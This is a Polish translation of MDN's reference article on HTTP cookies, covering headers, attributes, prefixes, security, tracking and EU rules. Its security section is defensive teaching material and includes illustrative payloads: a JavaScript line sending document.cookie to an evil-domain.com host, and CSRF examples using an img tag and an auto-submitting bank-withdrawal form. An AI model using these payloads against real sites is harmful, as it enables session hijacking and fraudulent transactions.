---
title: Ciasteczka HTTP
slug: Web/HTTP/Cookies
tags:
  - aplikacje internetowe
  - ciasteczka
  - ciasteczka artykuł
  - dane
  - pamięć przeglądarki
  - pliki cookie
  - protokoły
  - prywatność
  - przeglądarka
  - serwer
  - śledzenie
  - żądania HTTP
translation_of: Web/HTTP/Cookies
original_slug: Web/HTTP/Ciasteczka
---
{{HTTPSidebar}}

Ciasteczka HTTP (pliki cookie) to niewielkie obiekty danych, które serwer wysyła do przeglądarki internetowej użytkownika. Przeglądarka może je przechowywać i wysyłać ponownie do tego samego serwera wraz z kolejnym żądaniem. Przeważnie są używane do określenia czy dwa żądania zostały nadane z tej samej przeglądarki, np. aby użytkownik pozostał zalogowany. Są sposobem na zapamiętanie informacji o stanie sesji pomimo bezstanowej natury protokołu HTTP.

Główne zastosowania ciasteczek:

- Zarządzanie sesją
  - : Loginy, koszyki sklepów internetowych, rezultaty w grach i wszystko inne o czym powinien pamiętać serwer
- Personalizacja
  - : Preferencje użytkownika, motywy i inne ustawienia
- Śledzenie
  - : Zapisywanie i analiza zachowania użytkownika

Ciasteczka wykorzystywano kiedyś do przechowywania wszelkiego rodzaju plików po stronie klienta. Było to uzasadnione w czasach, gdy brakowało alternatywnych rozwiązań. Aktualnie zaleca się stosowanie nowoczesnych API do zapamiętywania danych. Ciasteczka są wysyłane wraz z każdym żądaniem, więc mogą spowodować pogorszenie wydajności (szczególnie dla połączeń mobilnych). Nowoczesne API do przechowywania plików to [Web storage API](/pl/docs/Web/API/Web_Storage_API "DOM Storage") (`localStorage` i `sessionStorage`) oraz [IndexedDB](/pl/docs/Web/API/IndexedDB_API).

> **Note:** Aby podejrzeć przechowywane ciasteczka (lub inne pamięci, z których mogą korzystać strony internetowe) należy wejść w zakładkę [Dane](/pl/docs/Narzędzia/Storage_Inspector) w narzędziach dla programistów dostępnych w przeglądarce.

## Tworzenie ciasteczek

Otrzymując żądanie HTTP serwer może wysłać wraz z odpowiedzią nagłówek [Set-Cookie](/pl/docs/Web/HTTP/Headers/Set-Cookie). Ciasteczko jest zazwyczaj przechowywane przez przeglądarkę, by następnie zostać wysłane wraz z żądaniami do tego samego serwera jako wartość nagłówka [Cookie](/pl/docs/Web/HTTP/Headers/Cookie). Istnieje opcja ustawienia daty wygaśnięcia lub czasu trwania, po których ciasteczko nie będzie wysyłane. Dodatkowo można ustawić ograniczenia dla konkretnej domeny lub ścieżki, aby dla wartości innych niż podane nie przesyłać ciasteczka.

### Nagłówki `Set-Cookie` i `Cookie`

Nagłówek [Set-Cookie](/pl/docs/Web/HTTP/Headers/Set-Cookie) jest zawarty w odpowiedzi serwera na żądanie HTTP agenta użytkownika (np. przeglądarki). Przykładowo:

    Set-Cookie: <nazwa-ciasteczka>=<wartość-ciasteczka>

Ten nagłówek nadany przez serwer informuje klienta, że należy zapisać ciasteczko.

> **Note:** **Uwaga:** W odnośnikach znajdują się przykłady użycia nagłówka `Set-Cookie` w różnych aplikacjach uruchamianych po stronie serwera:\* [PHP](https://secure.php.net/manual/en/function.setcookie.php)
>
> - [Node.JS](https://nodejs.org/dist/latest-v8.x/docs/api/http.html#http_response_setheader_name_value)
> - [Python](https://docs.python.org/3/library/http.cookies.html)
> - [Ruby on Rails](https://api.rubyonrails.org/classes/ActionDispatch/Cookies.html)

    HTTP/2.0 200 OK
    Content-type: text/html
    Set-Cookie: yummy_cookie=choco
    Set-Cookie: tasty_cookie=strawberry

    [page content]

Teraz z każdym kolejnym żądaniem do serwera, używając nagłówka [Cookie](/pl/docs/Web/HTTP/Headers/Cookie), przeglądarka będzie wysyłać także wszystkie przechowywane ciasteczka.

    GET /sample_page.html HTTP/2.0
    Host: www.example.org
    Cookie: yummy_cookie=choco; tasty_cookie=strawberry

### Ciasteczka sesyjne

Ciasteczko stworzone w poprzedniej sekcji jest _ciasteczkiem sesyjnym_: zostaje usunięte wraz z wyłączeniem klienta, ponieważ nie użyto dyrektyw `Expires` lub `Max-Age`. Jednakże przeglądarki mogą użyć mechanizmu **przywracania sesji**, który zmienia większość ciasteczek sesyjnych w trwałe, tak jakby przeglądarka nie została nigdy zamknięta.

### Ciasteczka trwałe

Zamiast wygasnąć po wyłączeniu klienta, _trwałe ciasteczka_ wygasają w konkretnym terminie (`Expires`) lub po określonym czasie (`Max-Age`).

    Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;

> **Note:** **Uwaga**: Ustawiając termin wygaśnięcia, czas i data są określane w odniesieniu do klienta, który zapisuje ciasteczko, nie w odniesieniu do serwera.

### Ciasteczka `Secure` i `HttpOnly`

Bezpieczne ciasteczko może być wysłane do serwera tylko i wyłącznie zaszyfrowanym żądaniem protokołu HTTPS. Nawet używając dyrektywy `Secure`, poufne dane _nigdy_ nie powinny być przechowywane w ciasteczkach, ponieważ nie są one bezpieczne, a ta flaga nie może zaoferować dostatecznej ochrony. Zaczynając od przeglądarek Chrome 52 i Firefox 52, niepewne strony (`http:`) nie mają możliwości ustawiania ciasteczek z dyrektywą `Secure`.

Aby ograniczać możliwości przeprowadzenia ataku cross-site scripting ({{Glossary("XSS")}}), ciasteczka `HttpOnly` są niedostępnie dla JavaScript'owego {{domxref("Document.cookie")}} API; można je tylko wysyłać do serwera. Przykładowo, ciasteczka utrzymujące sesję po stronie serwera nie muszą być dostępne dla JavaScript'u, więc flaga `HttpOnly` powinna być ustawiona.

    Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly

### Zakres ciasteczek

Dyrektywy `Domain` i `Path` definiują _zakres_ ciasteczka: do jakich adresów URL ciasteczka powinny być wysyłane.

`Domain` określa dozwolone hosty sieciowe. Jeżeli nie jest ustawiona to domyślną wartością jest [host aktualnej lokalizacji dokumentu](/pl/docs/Web/API/Document/location), **z pominięciem subdomen.** Jeżeli dyrektywa `Domain` _jest_ określona to subdomeny zawsze są uwzględnione.

Przykładowo, jeżeli ustawiono `Domain=mozilla.org`, to ciasteczka są uwzględnione także dla subdomen takich jak `developer.mozilla.org`.

`Path` oznacza, że podana ścieżka URL musi być zawarta w żądanym adresie URL aby wysłać nagłówek `Cookie`. Znak %x2F ("/") jest uznawany za separator katalogu, a wszystkie podkatalogi także spełniają warunek.

Jeżeli ustawiono `Path=/docs`, to następujące przykładowe ścieżki będą pasować:

- `/docs`
- `/docs/Web/`
- `/docs/Web/HTTP`

### Ciasteczka `SameSite` {{experimental_inline}}

Ciasteczka `SameSite` pozwalają serwerom wymagać, aby nie były one przesyłane żądaniami pomiędzy stronami internetowymi (gdzie {{Glossary("Site")}} jest zdefiniowane jako rejestrowalna domena), co zapewnia pewną ochronę od ataków _Cross-Site Request Forgery_ ({{Glossary("CSRF")}}).

Ciasteczka `SameSite` są relatywnie nowe, ale [wspierane przez wszystkie główne przeglądarki internetowe](/pl/docs/Web/HTTP/headers/Set-Cookie#Browser_compatibility).

Przykładowo:

    Set-Cookie: nazwa=wartość; SameSite=Strict

Atrybut `SameSite` może przyjmować jedną z trzech wartości (bez rozróżniania wielkości liter):

- `None`
  - : Przeglądarka będzie wysyłać ciasteczka zarówno żądaniami pomiędzy stronami (_cross-site_) jak i żądaniami odnoszącymi się do aktualnej strony (_same-site_).
- `Strict`
  - : Przeglądarka będzie wysyłać ciasteczka tylko żądaniami _same-site_ (pochodzącymi z witryny, która ustawia ciasteczko). Jeżeli żądanie nie pochodzi z adresu URL aktualnej lokacji to żadne z ciasteczek oznaczonych atrybutem `Strict` nie zostanie przesłane.
- `Lax`
  - : Ciasteczka `SameSite` są wstrzymywane przy żądaniach, które wywołują ładowanie obrazów lub ramek z innych stron. Będą jednak wysłane, gdy użytkownik przechodzi do adresu URL z zewnętrznej strony, np. poprzez kliknięcie w link.

> **Note:** Przeglądarki decydują się na [domyślne ustawianie `SameSite=Lax`](https://www.chromestatus.com/feature/5088147346030592). Jeżeli istnieje potrzeba wysyła ciasteczka pomiędzy różnymi źródłami (_cross-origin_), należy zrezygnować z zabezpieczenia SameSite używając wartości `None` dla tej dyrektywy. Wymaga ona obecności atrybutu [`Secure`](#ciasteczka_secure_i_httponly).

### Prefiksy ciasteczek {{experimental_inline}}

Konstrukcja mechanizmu działania ciasteczek uniemożliwia serwerowi otrzymanie potwierdzenia ustawienia ciasteczka dla bezpiecznego źródła, a nawet dowiedzenia się _gdzie_ ciasteczko zostało pierwotnie ustawione.  Każda subdomena jak na przykład `application.example.com` może ustawić ciasteczko, które będzie wysyłane wraz z żądaniami do `example.com` lub do innych subdomen dzięki ustawieniu atrybutu _Domain_:

    Set-Cookie: CSRF=e8b667; Secure; Domain=example.com

Jeżeli podatna aplikacja jest dostępna na subdomenie to ten mechanizm może być wykorzystany w ataku *session fixation.* Gdy użytkownik odwiedza stronę na głównej domenie (lub innej subdomenie), aplikacja może zaufać istniejącej wartości wysłanej w ciasteczku użytkownika. To może pozwolić atakującemu ominąć zabezpieczenie przed CSRF lub przejąć sesję po zalogowaniu się użytkownika.

Alternatywnie, jeżeli główna domena nie używa {{Glossary("HSTS")}} z ustawioną opcją `includeSubdomains`,  to użytkownikowi podlegającemu właśnie atakowi MitM (być może podłączonemu do otwartej sieci Wi-Fi) może zostać zwrócona odpowiedź na żądanie wraz z ustawionym nagłówkiem [Set-Cookie](/pl/docs/Web/HTTP/Headers/Set-Cookie) z nieistniejącej subdomeny. Wynik końcowy byłby taki sam, ponieważ przeglądarka przechowywałaby nielegalny plik cookie i wysyłałaby go na wszystkie inne strony w domenie `example.com`.

Aby ograniczyć możliwości przeprowadzenia ataku _session fixation_ powinno się przede wszystkim ponownie generować wartości ciasteczka sesyjnego gdy użytkownik się uwierzytelnia (nawet jeśli ciasteczko już istnieje) i dokonywać powiązania tokena CSRF z użytkownikiem. W ramach silniejszej obrony możliwe jest użycie _prefiksów ciasteczek_ w celu potwierdzenia pewnych faktów na temat samych ciasteczek. Dostępne są dwa prefiksy:

- `__Host-`
  - : Jeżeli ciasteczko posiada ten prefiks, to będzie ono zaakceptowane tylko poprzez dyrektywę [Set-Cookie](/pl/docs/Web/HTTP/Headers/Set-Cookie) oznaczoną jako `Secure`, wysłaną z bezpiecznego źródła (HTTPS), _nie_ posiadającą atrybutu `Domain` i mającą atrybut `Path` o wartości `/`. Tym sposobem ciasteczka mogą być widoczne jako "domain-locked".
- `__Secure-`
  - : Jeżeli ciasteczko posiada ten prefiks, to będzie ono zaakceptowane tylko poprzez dyrektywę [Set-Cookie](/pl/docs/Web/HTTP/Headers/Set-Cookie) oznaczoną jako `Secure` i wysłaną z bezpiecznego źródła (HTTPS). Jest to słabsze zabezpieczenie niż prefiks `__Host-`.

Ciasteczka niespełniające kryteriów zostaną odrzucone przez przeglądarkę. Zapewnia to, że gdyby subdomena spróbowała stworzyć takie ciasteczko, to zostanie ono ograniczone do subdomeny lub całkowicie zignorowane. Podczas określania, czy użytkownik jest uwierzytelniony lub czy token CSRF jest poprawny, serwer aplikacji sprawdza tylko ciasteczka o określonych nazwach. Dzięki temu mechanizm prefiksów efektywnie działa jako obrona przed _session fixation._

> **Note:** Aplikacja będąca serwerem _musi_ sprawdzić ciasteczko o pełnej nazwie uwzględniającej prefiks. Dlatego agent użytkownika aplikacji _nie_ wytnie prefiksu przed wysłaniem ciasteczka w nagłówku {{HTTPHeader("Cookie")}}.

Aby uzyskać więcej informacji o prefiksach ciasteczek i aktualnym stanie wspieralności tego rozwiązania przez przeglądarki odwiedź [sekcję Set-Cookie](/pl/docs/Web/HTTP/Headers/Set-Cookie#Cookie_prefixes).

### Dostęp JavaScript za pomocą `Document.cookie`

Nowe ciasteczka mogą być tworzone z użyciem JavaScriptu poprzez użycie właściwości {{domxref("Document.cookie")}}, a jeżeli flaga `HttpOnly` nie jest ustawiona, to także istniejące ciasteczka są dostępne.

```js
document.cookie = "yummy_cookie=choco";
document.cookie = "tasty_cookie=strawberry";
console.log(document.cookie);
// logs "yummy_cookie=choco; tasty_cookie=strawberry"
```

Ciasteczka stworzone z użyciem JavaScriptu nie mogą zawierać flagi `HttpOnly`.

Ciasteczka dostępne dla JavaScriptu są narażone na cyberataki. Więcej szczegółów znajduje się w poniższej sekcji[.](/pl/docs/Web/HTTP/Cookies#Security)

## Bezpieczeństwo

> **Note:** Należy zawsze pamiętać, że informacje przechowywane w ciasteczkach będą widoczne i mogą zostać zmodyfikowane przez użytkownika. W zależności od aplikacji, pożądane może być użycie nieprzejrzystego identyfikatora sprawdzanego po stronie serwera lub rozważenie alternatywnych mechanizmów uwierzytelniania/poufności takich jak JSON Web Tokens.

### Przejmowanie sesji i XSS

Ciasteczka są często używane w aplikacjach webowych do identyfikowania użytkownika i jego uwierzytelnionej sesji, więc kradzież ciasteczka może prowadzić do jej przejęcia. Powszechnymi sposobami kradzieży ciasteczek są inżynieria społeczna i wykorzystywanie podatności XSS w aplikacjach.

```js
(new Image()).src = "http://www.evil-domain.com/steal-cookie?cookie=" + document.cookie;
```

Atrybut `HttpOnly` może pomóc uniknąć tego ataku poprzez zablokowanie JavaScriptowi dostępu do wartości ciasteczka.  Sposobem na złagodzenie skutków takiego ataku jest wdrożenie surowej [polityki bezpieczeństwa treści (_CSP_)](/pl/docs/Web/HTTP/CSP).

### Cross-site request forgery (CSRF)

Na stronie [Wikipedii](https://en.wikipedia.org/wiki/HTTP_cookie#Cross-site_request_forgery) znajduje się dobry przykład {{Glossary("CSRF")}}. W tej sytuacji ktoś załączył element "img", który tak na prawdę nie jest obrazem (np. na niefiltrowanym czacie lub forum), a zamiast tego jest żądaniem do serwera banku użytkownika mającym na celu wypłatę pieniędzy:

```html
<img src="https://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
```

Jeżeli jesteś aktualnie zalogowany na swoim koncie bankowym i odpowiadające ciasteczka są dalej aktualne (i nie ma żadnej dodatkowej walidacji), to próba załadowania "obrazka" zakończy się przelewem pieniędzy. Dla punktów końcowych wymagających żądania POST jest możliwe aby  programowo wykonać potwierdzenie formularza (być może zawartego w niewidzialnym elemencie `<iframe>`) gdy strona jest ładowana:

```html
<form action="https://bank.example.com/withdraw" method="POST">
  <input type="hidden" name="account" value="bob">
  <input type="hidden" name="amount" value="1000000">
  <input type="hidden" name="for" value="mallory">
</form>
<script>window.addEventListener('DOMContentLoaded', (e) => { document.querySelector('form').submit(); }</script>
```

Jest kilka technik, których stosowanie powinno być używane do zapobiegania CSRF:

- punkty końcowe GET powinny być idempotentne — akcje, które wprowadzają _zmianę_ i nie mają na celu zwykłego pobrania danych powinny być wykonywane żądaniem POST (lub inną metodą HTTP). Punkty końcowe POST nie powinny dodatkowo obsługiwać żądań GET z parametrami query.
- Token CSRF powinien być zawarty w elementach `<form>` poprzez użycie niewidzialnego pola wejściowego `<input type="hidden">`. Powinien on być unikalny dla każdego użytkownika i przechowywany (np. w ciasteczku) w sposób pozwalający serwerowi podejrzeć oczekiwną wartość w momencie odebrania żądania HTTP. Dla wszystkich nie-GET'owych żądań potencjalnie mogących wykonać jakąś akcję w systemie, ten token powinien być porównany z jego zapisaną wartością.  W przypadku niezgodności należy odrzucić takie żądanie.

  - Ta metoda zabezpieczania polega na tym, że atakujący nie jest w stanie przewidzieć jak wygląda otrzymany przez użytkownika token CSRF. Dodatkowo token powinien być generowany ponownie po każdym zalogowaniu się użytkownika.

- Ciasteczka używane do wykonywania poufnych akcji (takie jak ciasteczka sesyjne) powinny mieć krótki czas życia i atrybut `SameSite` ustawiony na `Strict` lub `Lax`. (zobacz [ciasteczka SameSite](#ciasteczka_samesite)). W przeglądarkach wspierających tę funkcjonalność, efektem będzie upewnienie się, że ciasteczko sesyjne \_nie\_\_ \_zostanie wysłane w żądaniach do innych stron, więc żądania te nie będą przez serwer aplikacji uwierzytelnione.
- Wdrożenie zarówno tokenów CSRF jak i ciasteczek `SameSite` zapewnia ochronę wszystkich przeglądarek nawet w przypadkach gdy ochrona mechanizmu `SameSite` nie może pomóc (np. gdy źródłem ataków jest oddzielna subdomena).
- Aby poznać inne metody zabezpieczające przed CSRF sprawdź [ściągawkę przygotowaną przez organizację OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html).

## Śledzenie i prywatność

### Ciasteczka podmiotów zewnętrznych (_third-party cookies_)

Ciasteczka zawsze mają przyporządkowaną jakąś domenę. Jeżeli jest ona tą samą domeną co domena aktualnie odwiedzanej strony to nazywamy ciasteczko _własnym_ (_first-party cookie_). W innym przypadku mówimy o ciasteczku _zewnętrznego podmiotu/witryny_. Podczas gdy ciasteczka własne są wysyłane tylko do serwerów, które je ustawiły, strona internetowa może zawierać obrazki lub inne komponenty przechowywane na serwerach w innych domenach (np. banery reklamowe). Takie ciasteczka są głównie używane do reklam i śledzenia. Dobrym przykładem są [ciasteczka używane przez Google](https://www.google.com/policies/technologies/types/). Większość przeglądarek domyślnie zezwala na działanie ciasteczek zewnętrznych podmiotów, ale istnieją dodatki blokujące je (np. [Privacy Badger](https://addons.mozilla.org/en-US/firefox/addon/privacy-badger-firefox/) stworzony przez [EFF](https://www.eff.org/)).

Jeżeli jako serwis internetowy nie ujawniasz faktu używania ciasteczek zewnętrznych podmiotów to zaufanie użytkowników może zostać nadszarpnięte, gdy się o tym dowiedzą. Wyraźna informacja (np. w polityce prywatności) zazwyczaj eliminuje wszelkie negatywne skutki ich obecności. Niektóre kraje mają także przepisy dotyczące ciasteczek. Zobacz na przykładzie [oświadczenia fundacji Wikimedia](https://wikimediafoundation.org/wiki/Cookie_statement) o plikach cookie.

### Do-Not-Track

Nie ma prawnych lub technologicznych wymagań używania nagłówka [DNT](/pl/docs/Web/HTTP/Headers/DNT), ale może on być użyty aby zasygnalizować, że aplikacja webowa powinna wyłączyć mechanizm śledzenia lub śledzenia poszczególnych użytkowników przez jednego użytkownika. Zobacz [DNT](/pl/docs/Web/HTTP/Headers/DNT) aby uzyskać więcej informacji.

### Dyrektywa UE ws. plików cookie

Wymagania dla ciasteczek w Unii Europejskiej są zdefiniowane w [dyrektywie 2009/136/EC](http://eur-lex.europa.eu/legal-content/EN/TXT/?uri=CELEX:32009L0136) wydanej przez Parlament Europejski, która weszła w życie 25 maja 2011. Dyrektywa sama w sobie nie jest prawem, ale wymaganiem wprowadzenia prawa spełniającego jej wymagania przez państwa członkowskie. Prawo może różnić się w zależności od państwa.

W skrócie, dyrektywa wymusza na zarządzających stronami internetowymi uzyskanie świadomej zgody od użytkowników na przechowywanie i pobieranie jakiejkolwiek informacji dostępnej na komputerze, komórce czy innym urządzeniu, z którego korzystają. Od wprowadzenia nowego prawa wiele stron dodało banery informujące użytkowników o używaniu ciasteczek.

Aby dowiedzieć się więcej, sprawdź [artykuł na Wikipedii](https://en.wikipedia.org/wiki/HTTP_cookie#EU_cookie_directive) oraz zdobądź informacje jak wygląda aktualne prawo w docelowym regionie.

### Ciasteczka zombie i  "Evercookies"

Bardziej radykalnym podejściem do ciasteczek są ciasteczka zombie lub "Evercookies", które po usunięciu są w stanie odtworzyć się na nowo. Zostały zaprojektowane tak, aby ciężko było usunąć je na zawsze. W celu zapewnienia tej funkcjonalności implementacje używają m.in. [Web storage API](/pl/docs/Web/API/Web_Storage_API "DOM Storage") i Flash Local Shared Objects.

- [Evercookie by Samy Kamkar](https://github.com/samyk/evercookie)
- [Zombie cookies on Wikipedia](https://en.wikipedia.org/wiki/Zombie_cookie)

## Zobacz także

- {{HTTPHeader("Set-Cookie")}}
- {{HTTPHeader("Cookie")}}
- {{domxref("Document.cookie")}}
- {{domxref("Navigator.cookieEnabled")}}
- [Inspecting cookies using the Storage Inspector](/pl/docs/Tools/Storage_Inspector)
- [Cookie specification: RFC 6265](https://tools.ietf.org/html/rfc6265)
- [HTTP cookie on Wikipedia](https://en.wikipedia.org/wiki/HTTP_cookie)
